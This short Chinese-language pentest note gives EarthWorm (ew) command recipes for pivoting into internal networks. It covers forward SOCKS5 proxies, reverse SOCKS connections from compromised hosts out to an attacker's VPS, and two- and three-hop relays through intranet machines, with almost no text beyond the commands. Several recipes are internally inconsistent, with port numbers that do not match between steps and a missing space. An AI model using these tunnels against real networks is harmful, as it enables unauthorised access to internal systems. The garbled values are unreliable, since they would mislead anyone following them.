![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/346.png)
  #### 正向(目标机存在外网IP)：
	>ew –s ssocksd –l 888
	连接sockscap64靶机外网IP+端口888
  #### 反弹socks5(目标机无外网IP)：
	外网攻击机：
	>ew -s rcsocks -l 1008 -e 888
	-l为socks软件连接的端口，-e为目标主机和vps的通信端口。
	靶机:
	>ew -s rssocks -d 外网IP -e 1008 
	sockscap64连接攻击机外网IP+端口1008
  #### 二级环境(A有外网，B内网无外网)：
	靶机B:
	>ew –s ssocksd –l 888
	靶机A:
	>ew –s lcx_tran –l 1080 –f 靶机B –g 888
	Sockscap64连接靶机外网IP+端口 1080
  #### 二级环境(A无外网，B内网无外网)：
	外网攻击机：
	>ew –s lcx_listen –l 10800 –e 888
	靶机B：
	>ew –s ssocksd –l 999
	靶机A:
	>ew -s lcx_slave -d 外网 -e 8888 -f 靶机B -g 9999 
	Sockscap64连接攻击机外网IP+端口 10080
  #### 三级环境(A无外网,B内网无外网通A,C通B)：
	外网攻击机：
	>ew -s rcsocks -l 1008 -e 888
	靶机A：
	>ew -s lcx_slave -d 外网攻击机 -e 888 -f 靶机B -g 999
	靶机B：
	>ew -s lcx_listen -l 999 -e 777
	靶机C:
	>ew -s rssocks -d靶机B -e 777
	Sockscap64连接攻击机外网IP+端口 1008
